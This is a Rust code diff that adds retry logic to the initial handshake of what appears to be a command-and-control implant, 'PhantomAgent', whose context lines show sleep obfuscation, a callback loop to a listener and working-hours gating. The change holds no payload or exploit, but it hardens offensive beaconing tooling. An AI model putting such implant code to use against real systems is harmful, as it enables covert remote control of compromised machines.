@@ -10,6 +10,11 @@ use crate::sleep_obfuscate::blocking_sleep;
 use super::PhantomAgent;
 use crate::error::PhantomError;
 
+/// Number of attempts for the init handshake before giving up.
+const INIT_HANDSHAKE_RETRIES: u32 = 3;
+/// Delay between init handshake retry attempts.
+const INIT_HANDSHAKE_RETRY_DELAY: Duration = Duration::from_secs(2);
+
 impl PhantomAgent {
     /// Run the main callback loop until exit conditions are met.
     pub async fn run(&mut self) -> Result<(), PhantomError> {
@@ -25,11 +30,7 @@ impl PhantomAgent {
             return Ok(());
         }
 
-        if self.config.listener_pub_key.is_some() {
-            self.ecdh_init_handshake().await?;
-        } else {
-            self.init_handshake().await?;
-        }
+        self.init_handshake_with_retry().await?;
         info!(agent_id = format_args!("0x{:08X}", self.agent_id), "phantom initialized");
 
         loop {
@@ -66,6 +67,40 @@ impl PhantomAgent {
         }
 
         Ok(())
+    }
+
+    /// Perform the init handshake with up to [`INIT_HANDSHAKE_RETRIES`] attempts.
+    ///
+    /// Transport errors (connection refused, timeout, listener race at startup)
+    /// are retried with a fixed backoff.  Non-transport errors (crypto, protocol,
+    /// config) are returned immediately — retrying them would not help.
+    async fn init_handshake_with_retry(&mut self) -> Result<(), PhantomError> {
+        for attempt in 1..=INIT_HANDSHAKE_RETRIES {
+            let result = if self.config.listener_pub_key.is_some() {
+                self.ecdh_init_handshake().await
+            } else {
+                self.init_handshake().await
+            };
+            match result {
+                Ok(()) => return Ok(()),
+                Err(e @ PhantomError::Transport(_)) => {
+                    warn!(
+                        attempt,
+                        max = INIT_HANDSHAKE_RETRIES,
+                        error = %e,
+                        "init handshake transport error; retrying"
+                    );
+                    if attempt < INIT_HANDSHAKE_RETRIES {
+                        tokio::time::sleep(INIT_HANDSHAKE_RETRY_DELAY).await;
+                    } else {
+                        return Err(e);
+                    }
+                }
+                Err(e) => return Err(e),
+            }
+        }
+        // unreachable: INIT_HANDSHAKE_RETRIES > 0 so the final iteration always returns
+        Err(PhantomError::Transport("init handshake failed after all retries".into()))
     }
 
     /// Block until the current time falls within the configured working-hours
